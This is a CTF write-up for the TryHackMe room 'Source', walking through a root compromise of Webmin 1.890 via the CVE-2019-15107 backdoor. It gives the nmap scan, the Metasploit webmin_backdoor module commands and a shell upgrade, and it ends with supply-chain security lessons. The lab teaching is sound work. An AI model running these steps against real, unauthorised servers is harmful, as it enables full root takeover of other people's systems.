# CTF Write-up: Source — TryHackMe

| | |
|---|---|
| **Platform**   | TryHackMe |
| **Machine**    | Source |
| **Difficulty** | Easy |
| **Tags**       | `Webmin` `CVE-2019-15107` `Unauthenticated RCE` `Root` |

> **Note:** This write-up is for the TryHackMe room "Source". The reference link provided corresponded to this room rather than "Unstable Twin".

---

## Introduction

Source is one of those rooms that teaches a real-world lesson in supply chain risk. The Webmin administrative panel running on this machine contains a backdoor that was secretly introduced into the software's source code in 2018 before being discovered in 2019. It's a sobering reminder that even trusted, widely-used software can be compromised at the source — and if you're running an unpatched version, a single unauthenticated request is all it takes to get root.

---

## Step 1 — Reconnaissance (Nmap)

```bash
nmap -sV -sC -p- <target-ip>
```

Two open ports:

- **Port 22** — SSH (OpenSSH)
- **Port 10000** — HTTP (MiniServ 1.890 — Webmin)

Port 10000 running Webmin 1.890 is the key finding here. A quick search confirms this version is affected by **CVE-2019-15107** — a backdoor that allows unauthenticated remote code execution. The software runs as root, meaning any shell we get will be a root shell right from the start.

---

## Step 2 — Exploitation (CVE-2019-15107 — Webmin Backdoor)

Opened Metasploit:

```bash
msfconsole
```

Searched for the Webmin exploit:

```bash
search webmin
```

Selected the backdoor module:

```bash
use exploit/linux/http/webmin_backdoor
```

Set the required options:

```bash
set RHOSTS <target-ip>
set RPORT 10000
set LHOST <your-ip>
set SSL true

run
```

Metasploit exploited the backdoor and returned a shell almost instantly. The backdoor works by sending a specially crafted request to the password change endpoint — the injected code in Webmin executes it without any authentication required.

---

## Step 3 — Shell Upgrade & Flags

The session opened as root — no privilege escalation needed on this one.

Upgraded the shell for better stability:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Grabbed both flags immediately since we landed as root:

**User flag:**

```bash
find / -name "user.txt" 2>/dev/null
cat /home/<user>/user.txt
```

> **FLAG:** `[user flag here]`

**Root flag:**

```bash
cat /root/root.txt
```

> **FLAG:** `[root flag here]`

---

## Summary & Takeaways

Source is one of the most direct paths to root on TryHackMe:

1. Nmap reveals Webmin 1.890 on port 10000.
2. CVE-2019-15107 is a backdoor introduced into the software itself.
3. Metasploit exploits it with no authentication needed.
4. Webmin runs as root — game over in one step.

The real-world lesson here is about supply chain security. The Webmin backdoor wasn't a bug — it was deliberate malicious code added to the project's source. Keeping software updated and using integrity verification (checksums, signed packages) is the defence. Running administrative panels like Webmin directly exposed to the internet, without a firewall or VPN in front of them, makes this catastrophic.
